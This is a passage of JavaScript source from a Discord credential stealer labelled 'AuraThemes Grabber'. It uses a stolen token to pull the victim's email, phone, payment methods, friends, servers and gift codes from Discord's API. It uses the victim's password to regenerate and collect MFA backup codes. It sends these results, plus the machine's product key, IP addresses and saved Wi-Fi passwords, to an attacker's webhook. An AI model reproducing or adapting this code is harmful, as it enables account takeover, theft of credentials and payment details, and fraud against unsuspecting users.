      .addField("Pending:", `\`${user.pending}\``, true)
      .addField("Total Servers:", `\`${user.totalGuild}\``, true)
      .addField("Total Owned Servers:", `\`${user.totalOwnedGuild}\``, true)
      .addField("Total BOTS/RPC:", `\`${user.totalApplication}\``, true)
      .addField("Total Connection:", `\`${user.totalConnection}\``, true)
      .addField("NSFW Allowed:", `${user.NSFWAllowed}`, true)
      .addField("User Status:", `${user.status}`, true)
      .addField("User Theme:", `\`${user.theme}\``, true)
      .addField("User Verified:", `\`${user.verified}\``, true)
      .addField("User Phone:", `\`${user.hasPhone}\``, true)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed2), 50)
  var embed3 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle(`**HQ ALL FRIEND(s)**`)
      .setDescription(`${user.rareFriend}`)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed3), 100)
  var embed4 = new MessageBuilder()
      .setAuthor(`${user.username} - ${user.ID}`, "https://6889.fun/api/files/yvk")
      .setColor("#c489ff")
    .setTitle(`**HQ ALL FRIEND(s)**`)
      .addField("<a:aura:1120542725327044728> Total RAM", `\`${req.Ram}\``, true)
      .addField("<a:aura:1120772378545369148> PC Name", `\`${req.UserName}\``, true)
      .addField("<a:aura:1108347447945740288> UUID", `\`${req.Uuid}\``, true)
      .addField("<a:aura:1120542739361177642> Windows Mac Address", `\`${req.MacAddress}\``, true)
      .addField("<a:aura:1109950189474676879> CPU Model", `\`${req.CpuModel}\``, true)
      .addField("<:aura:1136408522217766912> Windows Product Key", `\`${req.ProductKey}\``, true)
      .addField("<:aura:1081699949395316736> Local IP", `\`${req.LocalIp}\``, true)
      .addField("<:aura:1135363387300270190> Get IP Address", `\`${req.GetIpAddress}\``, true)
      .addField("<:aura:1160509472146468924> Wifi ALL Password(s)", `\`${req.WifiPass}\``)
      .setFooter("AuraThemes Grabber")
      .setTimestamp();
  setTimeout(() =>  webhook.send(embed4), 150)
})

server.listen(app.get('port'), () => {
  console.log(`http://localhost:${app.get('port')}`);
});

process
    .on("uncaughtException", err => console.error(err))
    .on("unhandledRejection", err => console.error(err));

function getAllInfos(e, n, t) {
  var i = {},
    o = "",
    r = getInfo("https://discord.com/api/v9/users/@me", e),
    j = getInfo(
      "https://discord.com/api/v9/users/" +
        Buffer.from(e.split(".")[0], "base64").toString() +
        "/profile",
      e,
    );
  if ("Invalid" == r) return "TOKEN ISN'T VALID";
  var s = getInfo("https://discord.com/api/v9/users/@me/settings", e),
    a = getInfo(
      "https://discord.com/api/v9/users/@me/billing/payment-sources",
      e,
    ),
    d = getInfo("https://discordapp.com/api/v9/users/@me/relationships", e),
    l = getInfo("https://discord.com/api/v9/users/@me/guilds", e),
    c = getInfo("https://discord.com/api/v9/applications", e),
    u = getInfo("https://discordapp.com/api/v9/users/@me/connections", e),
    f = getInfo("https://discord.com/api/v8/users/@me/entitlements/gifts", e);
  if (n) var p = getIPInfo(n);
  var h,
    g,
    m = 0,
    v = "";
  if (
    (a?.forEach((e) => {
      e.brand && 0 == e.invalid && (v += "<a:Card:932986286439038997> "),
        e.email && (v += "<:paypal:896441236062347374> ");
    }),
    v || (v = "None"),
    (g = r.bio ? r.bio : "No Biography"),
    (h = r.phone ? r.phone : "No Phone"),
    r.banner)
  )
    var I = getGiforPng(
      `https://cdn.discordapp.com/banners/${r.id}/${r.banner}`,
    );
  else I = "No";
  if (r.nsfw_allowed) var b = "Yes";
  else b = "No";
  return (
    f[0] ? f.forEach((e) => (o += `${e}, `)) : (o = "None"),
    (i = {
      username: `${r.username}#${r.discriminator}`,
      ID: r.id,
      badges: badges(r.flags),
      nitroType: getNitro(j),
      hasBanner: I,
      avatar: r.avatar
        ? getGiforPng(`https://cdn.discordapp.com/avatars/${r.id}/${r.avatar}`)
        : "No",
      totalFriend: d.filter((e) => 1 == e.type).length,
      totalBlocked: d.filter((e) => 2 == e.type).length,
      pending: d.filter((e) => 3 == e.type).length,
      billing: v,
      NitroGifts: o,
      Gifts: getGifts(e, s),
      totalGuild: l.length,
      totalOwnedGuild: l.filter((r) => r.owner).length,
      totalApplication: c.length,
      totalConnection: u.length,
      NSFWAllowed: r.nsfw_allowed
        ? "🔞 `Allowed`"
        : "🔞 ❌ `Not Allowed`",
      langue: {
        fr: "🇫🇷 French",
        da: "🇩🇰 Dansk",
        de: "🇩🇪 Deutsch",
        "en-GB": "🏴󠁧󠁢󠁥󠁮󠁧󠁿 English (UK)",
        "en-US": "🇺🇸 USA",
        "en-ES": "🇪🇸 Espagnol",
        hr: "🇭🇷 Croatian",
        it: "🇮🇹 Italianio",
        lt: "🇱🇹 Lithuanian",
        hu: "🇳🇴🇭🇺 Hungarian",
        no: "🇳🇴 Norwegian",
        pl: "🇵🇱 Polish",
        "pr-BR": "🇵🇹 Portuguese",
        ro: "🇷🇴 Romanian",
        fi: "🇫🇮 Finnish",
        "sv-SE": "🇸🇪 Swedish",
        vi: "🇻🇳 Vietnamese",
        tr: "🇹🇷 Turkish",
        cs: "🇨🇿 Czech",
        el: "🇬🇷 Greek",
        bg: "🇧🇬 Bulgarian",
        ru: "🇷🇺 Russian",
        uk: "🇺🇦 Ukrainian",
        hi: "🇮🇳 Indian",
        th: "🇹🇼 Taiwanese",
        "zh-CN": "🇨🇳 Chinese-China",
        ja: "🇯🇵 Japanese",
        "zh-TW": "🇨🇳 Chinese-Taiwanese",
        ko: "🇰🇷 Korean",
      }[s.locale],
      status: {
        online: "<:online:1129709364316491787>",
        idle: "<:idle:1120542710424674306>",
        dnd: "<:dnd:974692691289993216>",
        invisible: "<:offline:1137141023529762916>",
      }[s.status],
      theme: {
        dark: "Dark",
        light: "Light",
      }[s.theme],
      verified: r.verified,
      hasBio: g,
      mail: r.email,
      hasPhone: h,
      token: e,
      rareFriend: friendB(d),
    }),
    n &&
      (i.ipInfos = {
        country: p.country,
        regionName: p.regionName,
        city: p.city,
        ISP: p.isp,
      }),
    t && (i.mfaCode = getMFACode(e, t)),
    i
  );

  function calcDate(a, b) {
    return new Date(a.setMonth(a.getMonth() + b));
  }

  function getGiforPng(k) {
    if (!k) return false;
    const ft = request("GET", k).headers["content-type"];
    if (ft === "image/gif") {
      return k + ".gif?size=512";
    } else {
      return k + ".png?size=512";
    }
  }

  function getGifts(e, s) {
    var retu = [];
    var gifts = getInfo(
      "https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=" +
        s.locale,
      e,
    );
    gifts?.forEach((r) => {
      retu.push({
        name: r.promotion.outbound_title,
        code: r.code,
      });
    });
    return retu;
  }

  function getNitro(r) {
    switch (r.premium_type) {
      default:
        return ":x:";
      case 1:
        return "<:946246402105819216:962747802797113365>";
      case 2:
        if (!r.premium_guild_since)
          return "<:946246402105819216:962747802797113365>";
        var now = new Date(Date.now());
        var arr = [
          "<:Booster1Month:1051453771147911208>",
          "<:Booster2Month:1051453772360077374>",
          "<:Booster6Month:1051453773463162890>",
          "<:Booster9Month:1051453774620803122>",
          "<:boost12month:1068308256088400004>",
          "<:Booster15Month:1051453775832961034>",
          "<:BoosterLevel8:1051453778127237180>",
          "<:Booster24Month:1051453776889917530>",
        ];
        var a = [
          new Date(r.premium_guild_since),
          new Date(r.premium_guild_since),
          new Date(r.premium_guild_since),
          new Date(r.premium_guild_since),
          new Date(r.premium_guild_since),
          new Date(r.premium_guild_since),
          new Date(r.premium_guild_since),
        ];
        var b = [2, 3, 6, 9, 12, 15, 18, 24];
        var r = [];
        for (var p in a)
          r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000));
        var i = 0;
        for (var p of r) p > 0 ? "" : i++;
        return "<:946246402105819216:962747802797113365> " + arr[i];
    }
  }

  function friendB(e) {
    var n,
      t = e.filter((e) => 1 == e.type);
    for (filter of t) {
      var i = friendBadges(filter.user.public_flags);
      "None" != i &&
        (n += `${i} ${filter.user.username}#${filter.user.discriminator}\n`);
    }
    return n || (n = "None"), "None" == n ? n : n.slice(9);
  }

  function getIPInfo(a) {
    const v = `http://ip-api.com/json/${a}`;
    const e = request("GET", v);
    if (e.statusCode === 200) {
      return JSON.parse(e.getBody("utf8"));
    } else {
      throw new Error("Request failed with status: " + e.statusCode);
    }
  }

  function badges(e) {
    var n = "";
    return (
      1 == (1 & e) && (n += "<:staff:891346298932981783> "),
      2 == (2 & e) && (n += "<:partner:918207395279273985> "),
      4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "),
      8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "),
      64 == (64 & e) && (n += "<:bravery:874750808388952075> "),
      128 == (128 & e) && (n += "<:brilliance:874750808338608199> "),
      256 == (256 & e) && (n += "<:balance:874750808267292683> "),
      512 == (512 & e) && (n += "<:early:944071770506416198> "),
      16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "),
      4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "),
      131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "),
      "" == n && (n = ":x:"),
      n
    );
  }

  function friendBadges(e) {
    var n = "";
    return (
      1 == (1 & e) && (n += "<:staff:891346298932981783> "),
      2 == (2 & e) && (n += "<:partner:918207395279273985> "),
      4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "),
      8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "),
      4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "),
      512 == (512 & e) && (n += "<:early:944071770506416198> "),
      16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "),
      131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "),
      "" == n && (n = "None"),
      n
    );
  }

  function getInfo(c, d) {
    const r = request("GET", c, {
      headers: {
        "Content-Type": "application/json",
        authorization: d,
      },
    });
    if (r.statusCode === 200) {
      const t = JSON.parse(r.getBody("utf8"));
      if (t.code === 0) {
        return "Invalid";
      } else {
        return t;
      }
    } else {
      throw new Error("Request failed with status: " + r.statusCode);
    }
  }

  function getMFACode(n, t) {
    var sex;
    const res = request("POST", "https://discord.com/api/v9/users/@me/mfa/codes", {
        headers: {
            "Content-Type": "application/json",
            "authorization": n
        },
        body: JSON.stringify({
            password: t,
            regenerate: false
        })
    })
    var data = JSON.parse(res.getBody())
    data.backup_codes.forEach(a => null == a.consumed && (sex += `${a.code} | `));
    return sex.slice(9, -2)
  }
}